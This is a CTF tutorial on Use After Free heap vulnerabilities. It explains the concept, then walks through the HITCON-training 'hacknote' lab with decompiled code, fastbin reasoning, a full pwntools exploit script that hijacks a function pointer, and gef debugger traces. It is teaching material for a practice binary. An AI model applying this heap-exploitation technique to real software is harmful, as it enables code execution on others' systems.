# Use After Free

## Principle

Simply put, Use After Free means exactly what its name suggests — a memory block is used again after it has been freed. In practice, there are several possible scenarios:

- After a memory block is freed, the corresponding pointer is set to NULL, and then used again. Naturally, the program will crash.
- After a memory block is freed, the corresponding pointer is not set to NULL, and before it is used again, no code modifies that memory block. In this case, **the program will very likely continue to run normally**.
- After a memory block is freed, the corresponding pointer is not set to NULL, but before it is used again, some code modifies that memory. When the program uses this memory block again, **strange problems are very likely to occur**.

The **Use After Free** vulnerability we generally refer to mainly covers the latter two scenarios. Additionally, **a memory pointer that has not been set to NULL after being freed is commonly called a dangling pointer.**

Here is a simple example:

```c++
#include <stdio.h>
#include <stdlib.h>
typedef struct name {
  char *myname;
  void (*func)(char *str);
} NAME;
void myprint(char *str) { printf("%s\n", str); }
void printmyname() { printf("call print my name\n"); }
int main() {
  NAME *a;
  a = (NAME *)malloc(sizeof(struct name));
  a->func = myprint;
  a->myname = "I can also use it";
  a->func("this is my function");
  // free without modify
  free(a);
  a->func("I can also use it");
  // free with modify
  a->func = printmyname;
  a->func("this is my function");
  // set NULL
  a = NULL;
  printf("this pogram will crash...\n");
  a->func("can not be printed...");
}
```

The output is as follows:

```shell
➜  use_after_free git:(use_after_free) ✗ ./use_after_free                      
this is my function
I can also use it
call print my name
this pogram will crash...
[1]    38738 segmentation fault (core dumped)  ./use_after_free
```

## Example

Here we use [lab 10 hacknote](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/use_after_free/hitcon-training-hacknote) from HITCON-training as an example.

### Functionality Analysis

We can briefly analyze the program. At the beginning of the program there is a menu function, which contains:

```c
  puts(" 1. Add note          ");
  puts(" 2. Delete note       ");
  puts(" 3. Print note        ");
  puts(" 4. Exit              ");
```

Therefore, the program should have 3 main functionalities. Afterwards, the program executes the corresponding function based on user input.

#### add_note

From the program, we can see that it allows adding at most 5 notes. Each note has two fields: `void (*printnote)();` and `char *content;`, where `printnote` is set to a function that outputs the specific content of `content`.

The note struct is defined as follows:
```c
struct note {
  void (*printnote)();
  char *content;
};
```
The add_note function code is as follows:
```c++
unsigned int add_note()
{
  note *v0; // ebx
  signed int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf; // [esp+14h] [ebp-14h]
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( count <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !notelist[i] )
      {
        notelist[i] = malloc(8u);
        if ( !notelist[i] )
        {
          puts("Alloca Error");
          exit(-1);
        }
        notelist[i]->put = print_note_content;
        printf("Note size :");
        read(0, &buf, 8u);
        size = atoi(&buf);
        v0 = notelist[i];
        v0->content = malloc(size);
        if ( !notelist[i]->content )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, notelist[i]->content, size);
        puts("Success !");
        ++count;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}
```

#### print_note

print_note simply outputs the content of the note at the given index.

```c
unsigned int print_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
    notelist[v1]->put(notelist[v1]);
  return __readgsdword(0x14u) ^ v3;
}
```

#### delete_note

delete_note frees the corresponding note based on the given index. However, it is worth noting that during deletion, only a simple free is performed without setting the pointer to NULL. Obviously, this creates a Use After Free condition.

```c
unsigned int del_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
  {
    free(notelist[v1]->content);
    free(notelist[v1]);
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

### Exploit Analysis

We can see that a Use After Free situation can indeed occur. So how can we trigger it and exploit it? It should also be noted that this program contains a magic function. Is it possible to use Use After Free to make the program execute the magic function? **A very straightforward idea is to modify the note's `printnote` field to the address of the magic function, thereby executing the magic function when `printnote` is called.** So how do we do this?

Let's take a brief look at the specific flow of each note creation:

1. The program allocates 8 bytes of memory to store the note's printnote and content pointers.
2. The program allocates memory of the specified size based on user input, which is then used to store the content.

           +-----------------+                       
           |   printnote     |                       
           +-----------------+
           |   content       |       size              
           +-----------------+------------------->+----------------+
                                                  |     real       |
                                                  |    content     |
                                                  |                |
                                                  +----------------+

So, based on what we learned in the heap implementation section, the note is clearly a fastbin chunk (16 bytes in size). Our goal is to have a note's put field contain the address of the magic function, so we must find a way to overwrite a note's printnote pointer with the magic address. Since there is only one place in the program that assigns a value to printnote, we must use the writing of real content to perform the overwrite. The specific approach is as follows:

- Allocate note0 with a real content size of 16 (the size just needs to be in a different bin than the note size)
- Allocate note1 with a real content size of 16 (the size just needs to be in a different bin than the note size)
- Free note0
- Free note1
- At this point, the linked list in the fast bin for size-16 chunks is: note1->note0
- Allocate note2 and set the real content size to 8. Then, according to heap allocation rules:
  - note2 will actually be allocated the memory block corresponding to note1.
  - The real content will correspond to the chunk of note0.
- If we then write the magic address into note2's real content chunk, since we haven't set note0 to NULL, when we try to print note0 again, the program will call the magic function.

### Exploit Script

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

r = process('./hacknote')


def addnote(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def delnote(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))


def printnote(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


#gdb.attach(r)
magic = 0x08048986

addnote(32, "aaaa") # add note 0
addnote(32, "ddaa") # add note 1

delnote(0) # delete note 0
delnote(1) # delete note 1

addnote(8, p32(magic)) # add note 2

printnote(0) # print note 0

r.interactive()
```

Let's take a detailed look at the execution flow. First, set breakpoints:

**Set breakpoints at the two malloc calls**

```shell
gef➤  b *0x0804875C
Breakpoint 1 at 0x804875c
gef➤  b *0x080486CA
Breakpoint 2 at 0x80486ca
```

**Set breakpoints at the two free calls**

```shell
gef➤  b *0x08048893
Breakpoint 3 at 0x8048893
gef➤  b *0x080488A9
Breakpoint 4 at 0x80488a9
```

Then continue executing the program. We can see that when allocating note0, the allocated memory block address is 0x0804b008. (eax stores the function return value)

```asm
$eax   : 0x0804b008  →  0x00000000
$ebx   : 0x00000000
$ecx   : 0xf7fac780  →  0x00000000
$edx   : 0x0804b008  →  0x00000000
$esp   : 0xffffcf10  →  0x00000008
$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xf7fac000  →  0x001b1db0
$eip   : 0x080486cf  →  <add_note+89> add esp, 0x10
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
    0x80486c2 <add_note+76>    add    DWORD PTR [eax], eax
    0x80486c4 <add_note+78>    add    BYTE PTR [ebx+0x86a0cec], al
    0x80486ca <add_note+84>    call   0x80484e0 <malloc@plt>
 →  0x80486cf <add_note+89>    add    esp, 0x10
    0x80486d2 <add_note+92>    mov    edx, eax
    0x80486d4 <add_note+94>    mov    eax, DWORD PTR [ebp-0x1c]
    0x80486d7 <add_note+97>    mov    DWORD PTR [eax*4+0x804a070], edx
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffcf10', 'l8']
8
0xffffcf10│+0x00: 0x00000008	 ← $esp
0xffffcf14│+0x04: 0x00000000
0xffffcf18│+0x08: 0xf7e29ef5  →  <strtol+5> add eax, 0x18210b
0xffffcf1c│+0x0c: 0xf7e27260  →  <atoi+16> add esp, 0x1c
0xffffcf20│+0x10: 0xffffcf58  →  0xffff0a31  →  0x00000000
0xffffcf24│+0x14: 0x00000000
0xffffcf28│+0x18: 0x0000000a
0xffffcf2c│+0x1c: 0x00000000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
---Type <return> to continue, or q <return> to quit---
[#0] 0x80486cf → Name: add_note()
[#1] 0x8048ac5 → Name: main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap chunk 0x0804b008
UsedChunk(addr=0x804b008, size=0x10)
Chunk size: 16 (0x10)
Usable size: 12 (0xc)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
```

**The address allocated for note 0's content is 0x0804b018**

```asm
$eax   : 0x0804b018  →  0x00000000
$ebx   : 0x0804b008  →  0x0804865b  →  <print_note_content+0> push ebp
$ecx   : 0xf7fac780  →  0x00000000
$edx   : 0x0804b018  →  0x00000000
$esp   : 0xffffcf10  →  0x00000020
$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xf7fac000  →  0x001b1db0
$eip   : 0x08048761  →  <add_note+235> add esp, 0x10
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
    0x8048752 <add_note+220>   mov    al, ds:0x458b0804
    0x8048757 <add_note+225>   call   0x581173df
    0x804875c <add_note+230>   call   0x80484e0 <malloc@plt>
 →  0x8048761 <add_note+235>   add    esp, 0x10
    0x8048764 <add_note+238>   mov    DWORD PTR [ebx+0x4], eax
    0x8048767 <add_note+241>   mov    eax, DWORD PTR [ebp-0x1c]
    0x804876a <add_note+244>   mov    eax, DWORD PTR [eax*4+0x804a070]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffcf10', 'l8']
8
0xffffcf10│+0x00: 0x00000020	 ← $esp
0xffffcf14│+0x04: 0xffffcf34  →  0xf70a3233
0xffffcf18│+0x08: 0x00000008
0xffffcf1c│+0x0c: 0xf7e27260  →  <atoi+16> add esp, 0x1c
0xffffcf20│+0x10: 0xffffcf58  →  0xffff0a31  →  0x00000000
0xffffcf24│+0x14: 0x00000000
0xffffcf28│+0x18: 0x0000000a
0xffffcf2c│+0x1c: 0x00000000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
---Type <return> to continue, or q <return> to quit---
[#0] 0x8048761 → Name: add_note()
[#1] 0x8048ac5 → Name: main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap chunk 0x0804b018
UsedChunk(addr=0x804b018, size=0x28)
Chunk size: 40 (0x28)
Usable size: 36 (0x24)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
```

Similarly, we can determine that the addresses of note1 and its content are 0x0804b040 and 0x0804b050, respectively.

At the same time, we can also see that the content of note0 and note1 indeed corresponds to the respective memory blocks.

```asm
gef➤  grep aaaa
[+] Searching 'aaaa' in memory
[+] In '[heap]'(0x804b000-0x806c000), permission=rw-
  0x804b018 - 0x804b01c  →   "aaaa" 
gef➤  grep ddaa
[+] Searching 'ddaa' in memory
[+] In '[heap]'(0x804b000-0x806c000), permission=rw-
  0x804b050 - 0x804b054  →   "ddaa" 
```

Next comes the free process. We can observe that first, note0's content is freed:

```asm
 →  0x8048893 <del_note+143>   call   0x80484c0 <free@plt>
   ↳   0x80484c0 <free@plt+0>     jmp    DWORD PTR ds:0x804a018
       0x80484c6 <free@plt+6>     push   0x18
       0x80484cb <free@plt+11>    jmp    0x8048480
       0x80484d0 <__stack_chk_fail@plt+0> jmp    DWORD PTR ds:0x804a01c
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffcf20', 'l8']
8
0xffffcf20│+0x00: 0x0804b018  →  "aaaa"	 ← $esp

```

Then note0 itself is freed:

```asm
 →  0x80488a9 <del_note+165>   call   0x80484c0 <free@plt>
   ↳   0x80484c0 <free@plt+0>     jmp    DWORD PTR ds:0x804a018
       0x80484c6 <free@plt+6>     push   0x18
       0x80484cb <free@plt+11>    jmp    0x8048480
       0x80484d0 <__stack_chk_fail@plt+0> jmp    DWORD PTR ds:0x804a01c
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffcf20', 'l8']
8
0xffffcf20│+0x00: 0x0804b008  →  0x0804865b  →  <print_note_content+0> push ebp	 ← $esp
```

After the delete is complete, let's look at the bins. We can see that they are indeed stored in the corresponding fast bins:

```c++
gef➤  heap bins
───────────────────────────────────────────────────────────[ Fastbins for arena 0xf7fac780 ]───────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x8]  ←  UsedChunk(addr=0x804b008, size=0x10) 
Fastbins[idx=1, size=0xc] 0x00
Fastbins[idx=2, size=0x10] 0x00
Fastbins[idx=3, size=0x14]  ←  UsedChunk(addr=0x804b018, size=0x28) 
Fastbins[idx=4, size=0x18] 0x00
Fastbins[idx=5, size=0x1c] 0x00
Fastbins[idx=6, size=0x20] 0x00

```

After we finish deleting note1 as well, let's look at the bins again. We can see that the most recently deleted chunks are indeed at the head of the list.

```asm
gef➤  heap bins
───────────────────────────────────────────────────────────[ Fastbins for arena 0xf7fac780 ]───────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x8]  ←  UsedChunk(addr=0x804b040, size=0x10)  ←  UsedChunk(addr=0x804b008, size=0x10) 
Fastbins[idx=1, size=0xc] 0x00
Fastbins[idx=2, size=0x10] 0x00
Fastbins[idx=3, size=0x14]  ←  UsedChunk(addr=0x804b050, size=0x28)  ←  UsedChunk(addr=0x804b018, size=0x28) 
Fastbins[idx=4, size=0x18] 0x00
Fastbins[idx=5, size=0x1c] 0x00
Fastbins[idx=6, size=0x20] 0x00

```

Now, note2 is about to be allocated. Let's see what memory blocks note2 gets allocated:

**The memory block allocated for note2 is 0x804b040, which is actually the memory address corresponding to note1.**

```asm
[+] Heap-Analysis - malloc(8)=0x804b040
[+] Heap-Analysis - malloc(8)=0x804b040
0x080486cf in add_note ()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0x0804b040  →  0x0804b000  →  0x00000000
$ebx   : 0x00000000
$ecx   : 0xf7fac780  →  0x00000000
$edx   : 0x0804b040  →  0x0804b000  →  0x00000000
$esp   : 0xffffcf10  →  0x00000008
$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xf7fac000  →  0x001b1db0
$eip   : 0x080486cf  →  <add_note+89> add esp, 0x10
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
    0x80486c2 <add_note+76>    add    DWORD PTR [eax], eax
    0x80486c4 <add_note+78>    add    BYTE PTR [ebx+0x86a0cec], al
    0x80486ca <add_note+84>    call   0x80484e0 <malloc@plt>
 →  0x80486cf <add_note+89>    add    esp, 0x10
```

**The memory address allocated for note2's content is 0x804b008, which is the address corresponding to note0. This means that when we write content to note2's real content chunk, it will overwrite note0's put field.**

```asm
gef➤  n 1
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - malloc(8)=0x804b008
0x08048761 in add_note ()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0x0804b008  →  0x00000000
$ebx   : 0x0804b040  →  0x0804865b  →  <print_note_content+0> push ebp
$ecx   : 0xf7fac780  →  0x00000000
$edx   : 0x0804b008  →  0x00000000
$esp   : 0xffffcf10  →  0x00000008
$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xf7fac000  →  0x001b1db0
$eip   : 0x08048761  →  <add_note+235> add esp, 0x10
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
    0x8048752 <add_note+220>   mov    al, ds:0x458b0804
    0x8048757 <add_note+225>   call   0x581173df
    0x804875c <add_note+230>   call   0x80484e0 <malloc@plt>
 →  0x8048761 <add_note+235>   add    esp, 0x10
```

Let's verify this by looking at the state before the overwrite. We can see that this memory block's `printnote` pointer has already been set to NULL, which is determined by fastbin's free mechanism.

```asm
gef➤  x/2xw 0x804b008
0x804b008:	0x00000000	0x0804b018
```

After the overwrite, the specific values are as follows:

```asm
gef➤  x/2xw 0x804b008
0x804b008:	0x08048986	0x0804b00a
gef➤  x/i 0x08048986
   0x8048986 <magic>:	push   ebp
```

We can see that it has indeed been overwritten with the magic function address as intended.

The final execution result is as follows:

```shell
[+] Starting local process './hacknote': pid 35030
[*] Switching to interactive mode
flag{use_after_free}----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
```

Additionally, we can use gef's heap-analysis-helper to observe the overall heap allocation and deallocation process, as shown below:

```asm
gef➤  heap-analysis-helper 
[*] This feature is under development, expect bugs and unstability...
[+] Tracking malloc()
[+] Tracking free()
[+] Tracking realloc()
[+] Disabling hardware watchpoints (this may increase the latency)
[+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found.
[*] Note: The heap analysis slows down noticeably the execution. 
gef➤  c
Continuing.
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - malloc(32)=0x804b018
[+] Heap-Analysis - malloc(8)=0x804b040
[+] Heap-Analysis - malloc(32)=0x804b050
[+] Heap-Analysis - free(0x804b018)
[+] Heap-Analysis - watching 0x804b018
[+] Heap-Analysis - free(0x804b008)
[+] Heap-Analysis - watching 0x804b008
[+] Heap-Analysis - free(0x804b050)
[+] Heap-Analysis - watching 0x804b050
[+] Heap-Analysis - free(0x804b040)
[+] Heap-Analysis - watching 0x804b040
[+] Heap-Analysis - malloc(8)=0x804b040
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - Cleaning up
[+] Heap-Analysis - Re-enabling hardware watchpoints
[New process 36248]
process 36248 is executing new program: /bin/dash
[New process 36249]
process 36249 is executing new program: /bin/cat
[Inferior 3 (process 36249) exited normally]
```

The first entry here was output twice, which should be an issue with the gef tool.

## Challenges

- 2016 HCTF fheap
